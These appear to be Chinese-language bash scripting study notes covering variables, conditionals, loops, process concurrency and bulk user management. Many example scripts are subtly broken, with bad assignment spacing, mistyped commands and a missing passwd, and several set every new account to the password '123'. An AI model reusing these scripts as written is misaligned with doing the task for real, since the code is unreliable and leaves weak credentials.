执行历史命令中编号为`number`的命令\n# ! string       找到最近一个以指定str开头的命令, 如：!da  \n# !!  上一个命令（在脚本中是不能手动按方向键的）\n# !$  shell上一个命令的最后一个参数，\n比如：ls aaa/bb /etc/passwd,   再执行： head !$, 看到是的passwd的内容\n\n# ^D   退出\n\n# ^A   跳到最前\n# ^E   跳到最后\n# ^K   向后删除\n# ^U   向前 删除\n# ^Y   撤销\n# ^L\n\n# ^S   锁屏暂停\n# ^Q   恢复\n\n\n```\n\n\n\n**3.在bash程序中嵌入一个python代码** \n\n```bash\n#!/bin/bash\n# 第一行不是注释， 声明用哪个解释器 #!\n\nping -c1 114.114.114.114 && echo \"114.114.114.114 is up\" || echo \"114.114.114.114 id down\"\n\n\n# <<-DOF：EOF是开始结束的标识（小横杠代表以下按tab,下面的py代码可以不tab缩进), EOF是不成文的规范\n# 整个程序还是使用bash解释器，只不过是中间\"请来一个人 - python\"\n# 如下：\n/usr/bin/python3 <<-EOF\nprint(\"hello py\")\nEOF\necho \"hello bash\"\n# 在bash中调用 python： expect\n\n# 如果在python中使用bash， 要调用os.system('系统命令')\n```\n\n没有`-`的话，EOF作为结束符，前面不能有任何tab制表符。\n有`-`的话，EOF作为结束符，前面可以有tab制表符,`容错`率更高一点。\n\n**4.配合figlet打印菜单:**\n\n```bash\n#!/bin/bash\ncat <<EOF\n+-----------------------------------------------------+\n|                                         _          |\n|        _ __ ___   __ _ _ __ _   _  __ _| |         |\n|       | '_ \\` _ \\ / _\\` | '_ \\| | ||/ _\\` | |              |\n|       | | | | | | (_| | | | | |_| |(_| | |         |\n|       |_| |_| |_|\\__,_|_||_|\\__,_|\\__,_|_|         |\n|                                                    |\n+-----------------------------------------------------+\nEOF\n\n```\n\n\n\n**5.子shell**\n\n```bash\n#!/bin/bash\n\ncd ~/Desktop\nls\n\n# 这种做法，在终端执行完毕之后，当前目录还是没有变，因为他是在subshell （子shell中执行的）\n# 要想使得subshell中的生效，就要使用`.` 或者 `source`\n\n####### 执行脚本\n./01.sh      # 需要执行权限，在子shell中执行\nbash 01.sh   # 不需要执行权限，在子shell中执行\n\n01.sh          # 需要执行权限，在当前shell中执行\nsource 01.sh   # 不需要执行权限，在当前shell中执行\n\n```\n\n**6.shell元字符**\n\n通配符, 注意`区分`与`正则`中的元字符\n\n```bash\n#！/bin/bash  \n\n# * 任意多个字符     \nls /etc/net*\n\n# ? 任意一个字符     \nls home/xp?\n\n# [] 匹配括号内任意一个字符   \n[abc]\n[a-z]    \n[^a-zA-Z0-9]     # ^取反    \nl[io]ve         \nl[^a-z]ve          \n\n# ()  命令在子shell中执行     \n(umask 077; touch test.txt)    # 不影响创建文件的权限，当前shell的umask也没有改变   \n# ----- 回顾，子shell： .test.sh,     source x.sh\n\n# {}  集合     \ntouch {1..9}   \nmkdir /home/{111,222}              \nmkdir -pv /home/{333,{aaa,bbb}, 444}\ncp -rv /etc/{passwd, passwd.old}    # 前面的相同的路径可以写在一块，后面不同的{}起来\ncp -rv /etc/passwd{,.old}       # 前面的相同的路径可以写在一块，后面不同的{}起来\n\n# \\     转义符    让元字符回归本意      \necho \\*     \necho \\\\     \necho \\    #后面紧跟回车，也就转义了回车\n\n# -e 常规字符转变为特殊意义的：\necho -e \"a\\tb\\nc\"\n\n\n```\n\n**7.前台后台**\n\n```bash\n#!/bin/bash\n\n## &  (关闭xshell，对应的任务也跟着停止)\nsh test.sh &  \n\n## nohub  \n#任务放到后台，关闭标准输入，终端不再能够接收任何输入（标准输入）,重定向标准输出和标准错误到nohup.out中\nnohup sh test.sh  \n\n## 区分`nohub`与`&`:\n1.& 是指在后台运行，但当用户推出(挂起)的时候，命令自动也跟着退出\n2.nohub 退出终端之后该进程还是有的\n\n## nohub与&合体\n#将sh test.sh任务放到后台，但是依然可以使用标准输入，终端能够接收任何输入，重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。\nnohup sh test.sh  & \n\n\n## screen   \napt install screen   # 安装\n`sleep 100000` # 先执行,然后退出终端，\n`screen -list` # 再次打开终端,指定这个命令，看到id\n`screen -r yourID` # 然后输入这个命令,一切就回来了\n\n\n## shell的会话作业机制\nctrl +c # 杀掉的是前台进程\n# ^Z  放到后台， fg  调回来\nkill %3  # 给当前终端作业号为3的发信号\n\n## jobs 查看作业\n\n\n## 管道  |\n# tee 管道, -a 最佳\ndate | tee -a date.txt   # 输出到文件，同时截流（能在终端直观地看到）\n\n\n## 技巧: vim里面写脚本，可以按^Z暂停，到终端敲命令，让fg返回继续\n\n```\n\n**8.命令排序**\n\n1. `; `   不具备逻辑排序  （前面执行完毕就执行后面的，不管前面成功失败与否）\n\n2. `&& `  前面执行`成功`(即返回值$?为0)就执行后面的\n\n3. `||`   前面执行`失败`(即返回值$?为不为0)就执行后面的\n\n   相当于 if  else\n\n**9.echo颜色输出**\n\n使用场景：给用户醒目提示\n\n```bash\n#!/bin/bash\n\n# -e 才可以\n# \\e[1;3x \n# \\e[1;3x   前景色(30-37),m后面是文字       \necho -e \"\\e[1;31mThis is a red\"\necho -e \"\\e[1;33mThis is a yellow\"\n# 0m 恢复颜色\necho -e \"\\e[1;0m\"\necho -e \"no color\"\n\n## 常用： 前面变色之后，  后面紧跟：\\e[0m 不变色(后面的内容就正常了)\necho -e \"\\e[1;31mThis is a red text. \\e[0m\"\necho -e \"no color again\"\n\n\n## 背景色(40-47)\necho -e \"\\e[1;41mThis is a red text background coloe. \\e[0m\"\necho -e \"\\e[1;42mThis is a red text background coloe. \\e[0m\"\necho -e \"\\e[1;43mThis is a red text background coloe. \\e[0m\"\necho -e \"\\e[1;44mThis is a red text background coloe. \\e[0m\"\necho -e \"\\e[1;45mThis is a red text background coloe. \\e[0m\"\n\n\n\n# printf     也是，不过是加了输出格式\n\n```\n\n**10.切换用户**\n\n```bash\n# 切换用户尽量加  -\nsu - xxx   # 加横线， shell的环境也跟随改变 （login shell） ； 执行的是前四个: bashrc和profile\nsu xxx     # 不加横线，当前环境还是当前的    ()             ； 执行的是两个bashrc文件\n\n\n```\n\n**11.关于bash的文件**\n\n```bash\n## 关于bash的文件：\n# 系统级别    来到shell时候执行\n/etc/profile\n/etc/bashrc\n# 用户级别    来到shell时候执行\n~/.bashrc\n~/.profile\n# 离开shell时候执行\n~/.bash_logout\n~/.bash_history\n\n# 修改用户的shell\nusermod -s /bin/bash xps    \n\n\n# 下面两个\n# login shell\n# nologin shell\n\n# /bin/bash\n# /sbin/nologin\n\n```\n\n**12.其他**\n\n```bash\n# shift\t\t\t使位置参数向左移动，默认移动1位，可以使用shift2\nwhile [ $# -ne 0 ]\ndo\n\tlet sum+=$i\n\tshift\n\t# shift 2\ndone\necho \"$sum\"\n\n```\n\n\n\n\n\n#### 二.变量\n\n##### 位置变量\n\n```bash\n脚本执行时，后面的第几个参数   $1 后面第一个参数      $2  $3    ${10}\n\n## 比如下面的例子;\n# bash test.sh 111 222 333\nping -c1 $1 &>/dev/null\nif [ $? -eq 0 ]           # 如果`上一条命令`返回值等于0(正常执行)   -eq\nthen\n    echo \"$1 is up\"\nelse\n    echo \"$1 is down\"\nfi\n```\n\n\n\n##### 预定义变量\n\n```bash\n$0    # 脚本名\n$*    # 所有的参数\n$@    # 所有的参数\n$#    # 参数的个数\n$$    # 当前进程的PID         echo $$\n$!    # 上一个`后台`进程的PID\n$?    # 上一个命令的返回值（0为成功）\n```\n\nping 文件\n\n```bash\n# 如果用户没有加参数\nif [ $# -eq 0 ];then\n    echo \"usage: file `basename $0`  need parmter\"\n    exit\nfi\n```\n\n如果是文件  -f\n\n```bash\n#  第一个参数如果不是文件\nif [ ! -f $1 ];then\n    echo \"not a file\"\n    exit\nfi\n\n##\n# 第一个参数是文件，从中读取ip然后ping\nfor ip in `cat $1`\ndo\n    ping -c1 ip $>/dev/null\n    if [ $? -eq 0 ];then          \n        echo \"$ip is up\"\n    else\n        echo \"$ip is down\"\n    fi\ndone\n\n\n##\n# basename    始终显示路径最后一个文件\n# dirname    始终显示路径前面目录的名字\n```\n\n\n\n##### 环境变量\n\nexport\n\n```bash\n## 在系统配置中用的多\n# 例如：自己添加环境变量：到/etc/profile\nPATH=$PATH:/new/bin\nexport PATH\n# 然后sourcess\n\n# 查看环境变量\necho $PATH\necho UID\necho $SHELL\necho $USER\necho $HISTORY      #历史记录命令默认记录1000条\n\n# 显示所有的环境变量：   \nenv\n\n# 取消环境变量：   \nunset 变量名\n```\n\n\n\n##### 自定义变量\n\n作用范围：`当前shell中`生效(`a.sh`或`bash a.sh`)， 子shell中不行\n\n```bash\n\n## 转为环境变量 export  (在一个脚本文件中export， 在另一个脚本中就可以获取了)\nexport ip1\n\n## ps: 自己没必要定义环境变量\nF1: 先 .test.sh    再echo $ip1\nF2: 或者在一个脚本中引用加载另外一个脚本(./test.sh)，后面就可以用了（没必要在每个文件中都定义一遍变量）\n```\n\n##### 变量的赋值\n\n1.显式赋值 （变量要以字母或者下划线开头，数字不可以开头）\n\n```bash\n## 常规赋值\n# shell中没有数据类型，都是字符串\n\n## 命令替换, 先把这个命令执行一遍再赋值: 反引号 ` `,   $()\ntoday = `date + %F`\n```\n\n2.read读取赋值\n\n```bash\n ## -p提示信息。-t等待时间。-n只要前面几个字符\n \n# read -p \"提示信息： \"  变量名\n# read -t 5 -p \"提示信息： \"  变量名\n# read -n 2  变量名\n# read 可以同时跟多个变量。空格隔开，直接一次性赋值\n\nread -p \"输入姓名，年龄，性别[e.g zhangsan 20 m]： \" name age gender\necho \"your name: $name, your age $age, your gender $gender\"\n\n\n### 注意事项：\n\"\"   # 弱引用(里面可以放变量$ip)\n''   # 强引用（里面不能引用变量,会原样输出）\n\n### 命令替换：  `` 等价于 $(), 里面的命令会先执行\n```\n\n##### 使用变量\n\n> 变量赋值，等号两边不能有空格\n\n```bash\nping -c1 $ip &>/dev/null && echo \"$ip is up\" || echo \"$ip is down\"\n```\n\n\n\n##### 变量引用\n\n```bash\n## 引用\n1. $变量\n2. ${变量}   # 大括号简单理解为：防止歧义\n```\n\n\n\n\n\n##### 变量的运算\n\n> 使用场景：内存使用, ping次数等 ... ... \n\n```bash\n## 1.整数运算    90%以上\n# 方法1：  expr        +   -    \\*   /   %\nexpr 1+2\nexpr $num1 + $num2\n\n# 方法2：  $(())       +   -   *   /     %          \necho $(($num1+$num2))\necho $((num1+num2))\necho $((5-3*2))\necho $(((5-3)*2))\necho $(((2**3))\necho $(((1+2));echo $sum\n\n\n# 方法3：  $[]         +  -  *  /  %\necho $[5+2]                  \necho $[5**2]\n\n\n# 方法4：  let       使用最多\nlet sum=2+3;echo $sum\nlet i++;echo $i\n\n\n\n## 2.小数运算\necho \"2*4\"|bc\necho \"2^4\"|bc\necho \"scale=2;6/4\"|bc\nawk 'BEGIN{print 1/2}'\necho \"print 5.0/2\"|python\n```\n\n##### 变量的删除/替换\n\n> 使用场景：让你输入值但是你没输入，我就给你一个默认值\n\n```bash\n### 删除\nurl=\"www.baidu.com\"\necho ${#url}   # 从前往后，井号，输出长度， 最短匹配\necho ${url#www.}   #  把前面部分删除\necho ${url#*baidu.}    #  把前面部分删除   * \necho ${url##*.}       # 从前往后，贪婪匹配，最长匹配\necho ${url%.}         # 从后往前, 最短匹配\necho ${url%%.}        # 从后往前，贪婪匹配\n\n### 切片\necho ${url：0:5}   # \necho ${url：5:5}   # 从5开始，拿5个\necho ${url：5:}\n\n\n### 变量内容的替换\nurl=\"www.baidu.com\"\necho ${url/baidu/sina}   # 百度换成新浪\n\necho ${url/n/N}\necho ${url//n/N}  # 贪婪匹配\n\n\n## ${变量名-新变量值}\n# 替代(没赋值；如果变量之前有值即便是空值就不能替代)   \nunset var1\necho ${var1-aaa}\n\n## ${变量名:-新变量值}\n# 没赋值或者为空，就可以替代；如果变量之前有值就不能替代\n\n### 拓展：\n${变量名+新变量值}\n${变量名:+新变量值}\n${变量名=新变量值}\n${变量名:=新变量值}\n${变量名?新变量值}\n${变量名:?新变量值}\n\n#### 自增自减\n# i++\n# ++i\n## 对变量值的影响： 没啥区别\n## 对表达式值的影响： ++i 先自增再赋值，  i++ 先赋值在自增\n\n\n```\n\n\n\n\n\n\n\n\n\n#### 三.条件判断\n\n##### if\n\n> shell中最核心的\n\n**1.文件测试 [操作符 + 文件或目录]**   \n\n命令格式1：`test`\n\n```bash\n# 比如判断文件是否存在，如果存在就备份(概念版)\nback_dir=/var/mysql_bak\nif ! test -d $back_dir;then     # 条件测试语句test， 如果不是目录或者这个目录不存在\n\tmkdir -p $back_dir\nfi\necho \"开始备份...\"\n# 执行 bash -vx test.sh        -vx可以看详细执行过程\n\n```\n\n命令格式2： `[ -d /home ]`    方括号取代了test(注意有空格)\n\n```bash\n# man test， 帮助文档相同。 前半边是命令[,  后半边]只是一个符号\nback_dir=/var/mysql_bak\nif [ ! -d $back_dir ];then     # 如果不是目录或者这个目录不存在\n\tmkdir -p $back_dir\nfi\necho \"开始备份...\"\n```\n\n命令格式3：  `[[ -d /home ]]`\n\n```bash\n# [ -e dir|file ]\n-d 是否是目录\n-f 是否为文件\n-r `当前用户`是否对该文件有读权限\n-w\n-l  是否是链接\n-b  是否为设备文件\n-c  是否为字符设备\n\n#\n[ ! -d /cc ] && mkdir /cc   # 当前不是一个目录或者目录如果不存在，就创建\n[ -d /ccc ] || mkdir /ccc   # 当前是一个目录或者目录如果存在，就不创建\n\n\n```\n\n**2.数值比较**\n\n```bash\n# [ 1 -gt 10 ]  大于\n-lt  小于\n-eq  等于\n-ne  不等于\n-ge  >=\n-le  <=\n```\n\n```bash\n#安装软件，先判断是否为root用户\nif [ $UID -ne 0 ];then         # $UID不等于0，代表不是root用户(数值比较)\n\techo \"你没有权限!\"\n\texit\nfi\napt install apache2\n```\n\n例子：用户输入(read)用户名，创建这个用户\n\n```bash\nread -p \"input the user name:  \" user\nid $user &>/dev/null\nif [ $? -eq 0 ];then     # 如果用户存在\n\techo \"user $user already exists\"\nelse\n\tuseradd $user\n\tif [ $? -eq 0 ];then\n\t\techo \"$user is created.\"\n\tfi\nfi\n```\n\n例子2： 如果磁盘是使用量超过90%， 就报警\n\n```bash\n# grep'/$' 是提取根分区， $(NF) 是倒数第一列， awk是以什么分割\n\ndick_use=`df -Th |grep'/$'|awk '{print $(NF-1)}'|awk -F\"%\" '{print $1}'`\nmail_user=alice\nwarn_file=/tmp/disk_warn.txt\nif [ $dick_use -gt 90 ];then\n\techo \"`date +%F:%H` disk: ${dick_use}%\" >warn_file\nfi\n\nif [ -f $disk_warn ];then      # 将报错文件发送给邮件用户\n\tmail -s \"disk  warning...\" $mail_user < $dick_use     # |mail -s 邮件主题\n\trm -rf $disk_warn\nfi\n\n# 可以用crontab，定时执行（crontab -e会把所有的任务清除）\n# 换行是 \\\n\n```\n\n**3.字符串比较**\n\n```bash\n=\n==\n!=\n[ -n \"hhh\" ]  # 长度不是0\n[ -z \"$user\" ]  # 长度为0  (变量为空/未定义 => 都是0)\n-a     # 并且    [1 -lt 1 -a 5 -gt 10]\n-r     # 或者\n&&\n||\n```\n\n```bash\nif [ $USER != 'root' ];then         # $USER不等于root(字符串比较)\n\techo \"你没有权限!\"\n\texit\nfi\napt install apache2\n```\n\n例子：批量创建用户\n\n```bash\n#尽量使用双引号引起来\n#[ \"$USER\" = \"root\" ]\n\n#!/bin/bash\n##################################\n#脚本规范\t\t\t\t\t\t #\n#useradd\t\t\t\t\t     #\n#V1.0 by xps 01/03/2020\t\t     #\n##################################\nread -p \"Please input number: \" num\n# read -p \"Please input 前缀: \" prefix\n\nwhile true\ndo\n\t# 对用户输入进行过滤（数字） ^[0-9]+$  正则 =~ (模式串不能带双引号)\n\t#if [[ ! \"$num\" =~ ^[0-9]+$ || \"$num\" =~ ^0+$ ]];then   # []单个方括号不支持正则，用[[ 变量 =~ 模式 ]]\n\tif [[ \"$num\" =~ ^[0-9]+$ ]];then  \n\t\tbreak\n\telse\n\t\tread -p \"不是数字，Please input number again: \" num\n\tfi \ndone\n\n\nread -p \"Please input 前缀: \" prefix\nwhile true\ndo\n\tif [ -n \"$prefix\" ];then   # 如果长度为非0\n\t\tbreak\n\telse\n\t\tread -p \"Please input 前缀: \" prefix\n\tfi\ndone\n\n# man seq   打印序列： seq 1 2 10 (区间，步长)\nfor i in `sql $num`\ndo\n\tuser=$prefix$i\n\tuseradd $user\n\techo \"123\" |passwd --stdin $user   # --stdin 前面输出的当做标准输入\n\tif [ $? -eq 0 ];then\n\t\techo \"$user is created.\"\n\tfi\ndone\n\n\n# declare 可以定义数据类型。但是一般不用，因为都是字符串\n\n\n\n## 语法不难，主要是对Linux系统以及命令的熟悉。\n\n```\n\n```bash\n# if后门紧跟的不一定是方括号，只要是能返回true/false的就行\n\nif [[ condition ]]; then\n\t#statements\nelif [[ condition ]]; then\n\t#statements\nelif [[ condition ]]; then\n\t#statements\nfi\n```\n\n\n\n##### switch\n\n语法结构\n\n```bash\ncase 变量 in\n模式1)\t\t\t\t# 都是字符串， 可以用通配符 (尽量使用双引号)\n\t命令序列1\n\t;;\n模式2)\n\t命令序列2\n\t;;\n模式3)\n\t命令序列3\n\t;;\n*)\n\t无匹配后命令序列\nesac\n```\n\n\n\n例子1：删除用户\n\n```bash\nread -p \"请输入要删除的用户名： \" user\nid $user &>/dev/null\nif [ &? -ne 0 ];then\n\techo \"no suc user: $user\"\n\texit 1\t# 返回1（意思是错误退出）\nfi\n\nread -p \"你确定要删除用户: $user 吗 ?[y/n]: \" action\ncase \"$action\" in\ny|Y|yes|YES)\n\tuserdel -r $user\n\techo \"deleted user: $user success!\"\n\t;;\n*)\n\techo \"error\"\nesac\n```\n\n例子2： 判断一个东西是不是命令\n\n```bash\n# command -v xxx\n# echo $? 返回为0就是\ncommand -v ls\n\ncmd1=/bin/date\nif command -v $cmd1 &>/dev/null;then\n\t# 神马都不做： 只加一个冒号\n\t:\nelse\n\techo \"$cmd1 是一个命令\"\nfi\n```\n\n例子3：通过登录堡垒机/跳板机 jumpserver ，然后登录内网的服务器 （简易版）\n\n```bash\n\n# 1.先登录到跳板机(普通账号)\n# 2.跳板机登录到other server（）\n\n# 登录两次，有点麻烦\n\n# 例子： 先登录到跳板机，再通过选项选择要登录到哪台服务器（1.密码认证 2.秘钥认证:以用户xps身份做 ssh-keygen, ssh-copy-id web1）\n# 以xps身份登录上来， 秘钥登录服务器\n# 脚本放到/home/xps/jumpserver.sh, 放到bashrc，登录这台机器就执行，并且禁止用户(^C)退出\n\n\ntrap \"\" HUP INT OUIT TSTP   # 捕捉键盘信号，然后啥也不做(^C也退出不了) ,让他登录跳板机不能干别的\nweb1=192.168.0.111\nweb2=192.168.0.112\nweb3=192.168.0.113\n\ncat <<-EOF\n+---------------------------+\n|       1. web1   \t\t    |\n|       2. web2             |\n|       3. mysql1           |\n+---------------------------+\nEOF\n\necho -en \"\\e[1;32minput number:  \\e[0m\"  # 显示颜色, -n不换行\nread num\nwhile true\ndo\n\tcase \"$num\" in\n\t1)\n\t\tssh xps@$web1\n\t\t;;\n\t2)\t\n\t\tssh xps@$web2\n\t\t;;\n\t3)\n\t\tssh xps@$mysql1\n\t\t;;\n\n\t\"\")\n\t\t# 用户啥也没输入\n\t\ttrue\n\t*）\t\n\t\techo \"error\"\n\tesac\ndone\n\n\n## 生产环境\n#1. 业务服务器不允许直接连接，允许通过跳板机连接\n#2. 业务服务器不允许root用户直接登录\n\n### 复杂版jumpserver(对用户行为进行行为/记录)  ---> 使用Python脚本\n```\n\n例子4：实现系统管理工具箱\n\n```bash\n#!/bin/bash\n\n## 实现系统管理工具箱\n# 定义一个函数\nmenu{\n\tcat <<-EOF\n\t##########################################\n\t#\t\th. help\t\t\t\t\t\t     #\n\t#\t\tf. disk partion\t\t\t\t     #\n\t#\t\td. filesystem mount\t\t\t\t #\n\t#\t\tm. memory\t\t\t\t\t\t #\n\t#\t\tu. system load\t\t\t\t\t #\n\t#\t\tq .exit\t\t\t\t\t\t\t #\n\t##########################################\n\tEOF\n}\nmenu\n\nwhile true\ndo\n\tread -p \"Please input[h for help]: \" action\n\tcase \"$action\" in\n\th)\t\tclear; menu;;\n\tf)\t\tfdisk -l;;\n\td)\t\tdf -Th;;\n\tm)\t\tfree -m;;\n\tu)\t\tuptime;;\n\tq)\t\tbreak;;\n\t\"\") \t;;\n\t*)\t\techo \"error\";;\n\tesac\ndone\necho \"finish...\"\n```\n\n\n\n\n\n##### 各种符号\n\n```bash\n#!/bin/bash\n\n()    # 在子shell中执行\n((1<2))   # C语言风格的比较\n$(date)           # touch $(date +%F)_file.txt      先执行里面的命令再执行外面的\n$(())   # 运算\n\n{}     # 集合{1..5}\n${}    # 变量的引用\n\n[]     # 条件测试           逻辑符号 [ a -a b  ]\n[[]]   # 升级版的。  支持正则匹配 [[ =~ ]]， 逻辑符号 [[ a && b ]]\n\n$[] # 整数运算\n\n\n####### 执行脚本\n./01.sh      # 需要执行权限，在子shell中执行\nbash 01.sh   # 不需要执行权限，在子shell中执行\n\n01.sh          # 需要执行权限，在当前shell中执行\nsource 01.sh   # 不需要执行权限，在当前shell中执行\n\n\n###### 调试脚本\nsh -n 02.sh    # 仅调试syntax error\nsh -vx 02.sh   # 仅调试的方式执行，查询整个执行过程\n\n```\n\n\n\n\n\n#### 四.循环\n\n##### for循环\n\n> 处理固定循环的时候，for有优势\n\n形式\n\n```bash\nfor 变量名 [ in 列表 ]\ndo\n\t循环体\ndone\n```\n\n拓展： 查看脚本运行时间:  `time ./a.sh`\n\n例子1： for循环ping机器\n\n```bash\n# 重定向\n>ip.txt\n# {2..254}  集合，  另一个序列: seq `2 254`\nfor i in {2..254}\ndo\n\t{\n\t$ip = 192.168.111.$i\n\tping -c1 -W1 $ip &>/dev/null   # -W等待多少时间\n\tif [ $? -eq 0 ]; then\n\t\techo \"$ip\" | tee -a ping.txt\n\tfi\n\t}&    # 用大括号和&, 把整个循环【放到后台】\ndone\nwait    # 等待前面的所有【后台】进程结束，再执行后面的\necho \"finish !\"\n```\n\n例子2：从文件中读取主机，然后ping\n\n```bash\n# {2..254}  集合，  另一个序列: seq `2 254`\nfor ip in `cat ips.txt`\ndo\n\tping -c1 -W1 $ip &>/dev/null   # -W等待多少时间\n\tif [ $? -eq 0 ]; then\n\t\techo \"$ip is up!\" \n\telse \n\t\techo \"$ip is down!\" \n\tfi\ndone\nwait    # 等待前面的所有【后台】进程结束，再执行后门的\necho \"finish !\"\n\n```\n\n例子3：批量创建账号\n\n```bash\nwhile :\ndo\n\tread -p \"input your prefix  & passwd & number : \" prefix passwd number\n\tprintf \"user information:\n\t---------------------------\n\tusername: $passwd\n\tprefix: $prefix\n\tnumber: $number\n\t---------------------------\n\t\"\n\tread -p \"Are you sure?[y/n]\" action\n\tif [ \"$action\" = \"y\" ];then\n\t\tbreak\n\tfi\ndone\n\necho \"continue ...\"\n# 然后是接下来的功能\nfor i in `seq -w  $number`\ndo\n\tuser = $prefix%i\n\tid $user &>/dv/null\n\tif [ $? -eq ];then\n\t\techo \"user $user already exists\"\n\telse\n\t\tuseradd $user\n\t\techo \"$passwd\" | --stdin $user    # 将密码作为标准输入\n\t\tif [ $? -eq 0 ];then\n\t\t\techo \"$user is created.\"\n\t\tfi\n\tfi \ndone\n\n# bash -n .sh     检查脚本错误\n```\n\n例子4：批量创建账号（从文件中）\n\n```bash\npasswd = 123\n# 必须要输入文件\nif [ $# -eq 0 ];then\n\techo \"usage: `basename $0` file\"\n\texit\nfi\n# 判断输入的是否是文件\nif [ ! -f $1 ];then\n\techo \"error file\"\n\texit 2\nfi\n# 开始(两列 -- > 把密码和用户名分开)\n# 应该：重新定义分隔符\n# IFS内部字段分隔符,比如下面的回车\n# IFS = $'\\n'  \nfor line in `cat $1`  # 位置变量 ,   for对空行不感冒\ndo\n\t# 长度为0就跳过\n\tif $[ ${#line} -eq 0 ];then\n\t\techo \"Nothing to do.\"\n\t\tcontinue\n\tfi\n\tuser = `echo \"$line\" |awk 'print &1'`\n\tpass = `echo \"$line\" |awk 'print &2'`\n\tid $user &>/dv/null\n\tif [ $? -eq ];then\n\t\techo \"user $user already exists\"\n\telse\n\t\tuseradd $user\n\t\techo \"$pass\" | --stdin $user &>/dev/null    # 将密码作为标准输入\n\t\tif [ $? -eq 0 ];then\n\t\t\techo \"$user is created.\"\n\t\tfi\n\tfi \ndone\n\n```\n\n例子5：批量修改密码(剩下的功能自己完善)\n\n```bash\n# 目前：通的放一个文件，不通的放一个文件\nfor ip in $(cat ip.txt)\ndo\n\t{\n\t\tping -c1 -W1 $ip &>/dev/null\n\t\tif [ $? -eq 0 ];then\n\t\t\tssh $ip echo \"123\" |passwd --stdin $user   # 采用的公钥认证\n\t\t\tif [ $? -eq 0 ];then\n\t\t\t\techo \"$ip\" >>success_`date + %F`.txt\n\t\t\telse\n\t\t\t\techo \"$ip\" >>failed_`date + %F`.txt\n\t\t\tfi\n\t\telse\n\t\t\techo \"$ip\" >>failed_`date + %F`.txt\n\t\tfi\n\t\t\n\t}&\ndone\nwait\necho \"end!\"\n```\n\n例子6：批量修改主机ssh设置\n\n```bash\nssh $ip \"sed -ri '/~#UseDNS/cUseDNS0 no' /etc/ssd/sshd_config\"   # 搜索并替换(c)\n```\n\n\n\n##### while循环\n\n> 逐行读取文件的时候，while有优势\n>\n> 不用像for循环那样担心每一行的空格空行\n>\n> 所以：读取一个文件中逐行处理，while比for好用\n\n例子1：创建用户\n\n```bash\n# 以后，读取一个文件中逐行处理，while比for好用\nwhile read line:\ndo\n\t# 判断用户数是否输入参数\n\tif [ ${#line} -eq 0 ];then\n\t\tcontinue\n\tfi\n\n\tuser = `echo $line|awk '{printf $1}'`\n\tpass = `echo $line|awk '{printf $2}'`\n\tid $user &>/dev/null\n\tif [ $? -eq 0 ];then\n\t\techo \"user $user already exists\"\n\telse\n\t\tuseradd $user\n\t\techo \"$pass\" | --stdin $user &>/dev/null    # 将密码作为标准输入\n\t\tif [ $? -eq 0 ];then\n\t\t\techo \"$user is created.\"\n\t\tfi\n\tfi\ndone < $1 # 可以换成位置变量,   从文件里面读取用户名(read不用-p了)\n# done < user.tx  # \n\n```\n\n例子2：while实现连接测试\n\n```bash\n# 只要ping通就一直ping（【条件为true时候一直执行循环】）\nip=192.168.0.5\nwhile ping -c1 -W1 $ip &>/dev/null; do\n\tsleep 1\ndone\necho \"$ip is down!\"\n```\n\n例子3：until 实现连接测试\n\n```bash\nip=192.168.0.5\nuntil ping -c1 -W1 $ip &>/dev/null; do\n\tsleep 1\ndone\necho \"$ip is up!\"   \n```\n\n- while 适合写主机下线\n- until 适合写主机上线\n\n\n\n##### until循环\n\n形式\n\n```bash\n# 当条件测试为false时候执行循环体\nuntil 条件测试\ndo\n\t循环体\ndone\n\n```\n\n例子1：until实现数值运算\n\n```bash\n# i=1\nuntil [ $i -gt 100 ]    # >100\ndo\n\tlet sum+=$i\n\tlet i++\ndone\necho \"sum: $sum\"\n```\n\n例子2：while实现数值运算\n\n```bash\n#数值运算：let\ni=1\nwhile [ $i -le 100 ]   # <=100\ndo\n\tlet sum+=$i\ndone\necho \"sum: $sum\"\n\n```\n\n\n\n##### 并发\n\n 并发  ---> 多进程  \n\n之前写的传统并发的方式，多进程（返回是时间是乱序的）  \n\n **缺点：**有些并发数量太多，会报错\n\n**格式:**\n\n```bash\n...\n{\n\t...\n}&\nwait\n...\n```\n\n比如：\n\n```bash\nfor i in {1..254}\ndo\n\t{\n\t\tip=192.168.0.$i\n\t\tping -c1 -W1 $ip &>/dev/null\n\t\tif [ $? -eq 0 ];then\n\t\t\techo \"$ip is up.\"\n\t\telse\n\t\t\techo \"$ip is down.\"\n\t\tfi\n\t}&\ndone\nwait\necho \"执行结束...\"\n```\n\n**控制并发的数量**\n\n```bash\n### 1). FD(File Descriptors)文件描述符 或 文件句柄 \n# 进程使用文件描述符来管理打开的文件（位置： /proc/进程id/fd/）\n# $$是当前进程\n\nexec 6<> /file1    # 1.手动指定描述符来 打开文件\necho \"111\" >> /proc/$$/fd/6    # 2.写入到了file1\n# 3.删除file1\n# 4.然后查看文件句柄:\nll /proc/$$/fd\n# 会发现6显示删除状态\n## 5.把6这个文件拷贝出来变成file1,就又回来了（如果文件句柄没有删除或关闭。就算原文件被删除了，句柄依然在）\nls of # 6.列出打开的文件\nexec 6<&-    # 7.释放文件的句柄 \n\n\n\n### 2). 管道\n## 匿名管道(一个终端内使用) |\n## 跨终端使用   mkfifo\nmkfifo  /tmp/fifo1   # 创建\nll /dev > /tmp/fifo1 # 把dev重定向到管道中，另一个终端就可以用了\n# 另一个终端使用： \ngrep 'sda' /tmp/fifo1 \n```\n\n例子：\n\n```bash\nthread=5\ntmp_fifofile=/tmp/$$.fifo\n\nmkfifo $tmp_fifofile\nexec 8<> $tmp_fifofile\nrm $tmp_fifofile\n\nfor i in `seq $thread`\ndo\n\techo >&8   # 操作的是文件描述符（）\ndone\n\nfor i in {1..254}\ndo\n\tread -u 8    # -u 是读取文件描述符内容（逐行）\n\t{\n\t\tip=192.168.0.$i\n\t\tping -c1 -W1 $ip &>/dev/null\n\t\tif [ $? -eq 0 ];then\n\t\t\techo \"$ip is up.\"\n\t\telse\n\t\t\techo \"$ip is down.\"\n\t\tfi\n\t\techo >&8  # 有借有还（借一个还一个，不能让文件描述符里面空）\n\t}&\ndone\nwait\necho \"执行结束.  ..\"\n# 执行结果是5个5个出来的（因为定义的进程是5个）\n\n```\n\n\n\n##### expect\n\n expect ----> 不是shell，是一个新的语言\n\n解决交互的繁琐操作\n\n安装：`apt install expect`\n\n\n\nexpect实现批量远程命令执行\n\n```bash\n# 如果for while，需要一步步的交互(比较麻烦)，但是可以使用公钥认证(ssh-keygen,ssh-copy-id)\n#第一步，实现了公钥认证\n# 